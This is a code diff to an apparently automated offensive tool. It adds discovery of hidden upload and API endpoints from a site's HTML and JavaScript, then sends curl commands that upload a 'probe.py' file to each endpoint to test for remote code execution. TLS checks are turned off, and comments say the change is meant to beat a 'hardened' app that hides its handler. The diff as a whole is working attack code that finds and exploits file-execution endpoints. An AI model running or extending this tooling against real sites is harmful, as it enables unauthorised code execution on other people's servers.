@@ -236,6 +236,86 @@ _WEB_PATH_ATTR_RE = re.compile(
     r"([^\"'<>\s]{2,180})[\"']", re.I)
 _DEFAULT_UPLOAD_PATHS = ("/upload",)
 
+# A hardened app hides its upload/API handler in a script rather than in an
+# <a href>. The attribute regex above cannot see `const api='/x/y'`, so the
+# RCE probe also reads quoted absolute paths from HTML and JS.
+_QUOTED_PATH_RE = re.compile(
+    r"""["'](/[A-Za-z0-9_./~-]{2,180})["']""")
+_STATIC_SUFFIXES = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                    ".ico", ".woff", ".woff2", ".map", ".json", ".txt")
+
+
+def _candidate_quoted_paths(body: str, limit: int = 12):
+    """Absolute paths quoted inside HTML/JS (handlers, fetch() endpoints)."""
+    out = []
+    if not isinstance(body, str):
+        return out
+    for m in _QUOTED_PATH_RE.finditer(body[:200000]):
+        path = m.group(1).strip()
+        if not path or path.startswith("//"):
+            continue
+        path = path.split("?", 1)[0].split("#", 1)[0]
+        if len(path) < 2 or len(path) > 180 or path in out:
+            continue
+        out.append(path)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _probeable_paths(paths, limit: int = 6):
+    """Drop assets that cannot be an upload/API handler, keep order."""
+    out = []
+    for path in paths or []:
+        if not isinstance(path, str) or not path.startswith("/"):
+            continue
+        if path.lower().endswith(_STATIC_SUFFIXES) or path in out:
+            continue
+        out.append(path)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _discover_web_paths(base: str):
+    """Paths the app's own HTML/JS references, fetched with a small budget.
+
+    The hardened lab only exposes its RCE endpoint as
+    `const api='/internal/v2/report/run'` in a script: no form, no link, and
+    `/upload` answers 403. Probing only the conventional path reported "no
+    RCE" on a box that executes uploads. Returns [] on any failure; the
+    conventional defaults still run afterwards.
+    """
+    import ssl
+    import urllib.request
+
+    if not base:
+        return []
+    context = ssl._create_unverified_context()
+
+    def fetch(path: str) -> str:
+        try:
+            req = urllib.request.Request(
+                base + path, headers={"User-Agent": "Mozilla/5.0 Phantom"})
+            with urllib.request.urlopen(req, timeout=2.5,
+                                        context=context) as resp:
+                return resp.read(160000).decode("utf-8", "replace")
+        except Exception:
+            return ""
+
+    home = fetch("/")
+    if not home:
+        return []
+    found = [path for path, _ in _candidate_web_paths(home)]
+    found += _candidate_quoted_paths(home)
+    scripts = [path for path in dict.fromkeys(found)
+               if path.lower().endswith(".js")][:3]
+    for script in scripts:
+        body = fetch(script)
+        found += [path for path, _ in _candidate_web_paths(body)]
+        found += _candidate_quoted_paths(body)
+    return list(dict.fromkeys(found))
+
 
 def _candidate_web_paths(body: str, limit: int = 8):
     """[(path, evidence)] for the paths this document/script references.
@@ -2489,6 +2569,14 @@ def _web_rce_adapter(wm, slots):
                 paths.append(p)
     except Exception:
         paths = []
+    try:
+        discovered = _probeable_paths(
+            _discover_web_paths(f"{scheme}://{_hport(target, port)}"))
+        # The app's own handler beats a guessed default; keep /upload as a
+        # fallback for apps that really do use it.
+        paths = [p for p in discovered if p not in paths] + paths
+    except Exception:
+        pass
     for p in _DEFAULT_UPLOAD_PATHS:
         if p not in paths:
             paths.append(p)
@@ -2496,8 +2584,8 @@ def _web_rce_adapter(wm, slots):
     segments = []
     for p in paths[:6]:
         segments.append(
-            f"curl -s -m 8 -F 'file=@{tmp};filename=probe.py' "
-            f"{scheme}://{netloc}{p} | grep -o '{marker}:[0-9]*'")
+            f"curl -s -k -m 8 -F 'file=@{tmp};filename=probe.py' "
+            f"{scheme}://{netloc}{p} | grep -o '{marker}:[0-9]*' || true")
     probes = _join_local_shell(segments)
     tried = " ".join(f"{scheme}://{netloc}{p}" for p in paths[:6])
     return f"echo 'RCE_PROBE_PATHS: {tried}' ; {probes}"
